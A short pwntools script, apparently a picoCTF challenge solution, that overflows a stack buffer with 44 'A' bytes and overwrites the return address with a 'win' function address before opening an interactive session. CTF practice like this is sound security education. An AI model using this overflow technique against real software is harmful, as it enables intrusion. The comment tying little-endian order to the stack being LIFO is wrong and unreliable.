from pwn import *
context.arch = 'amd64'


def start(server=True):
        if(server):
                return remote('saturn.picoctf.net', 53945)
        else:

                return process(['./vuln'])

io = start()
str1 = 'A' * 44
str1 += "\xf6\x91\x04\x08" #address of win function in little endian because stack is LIFO
io.sendline(str1)
io.interactive()
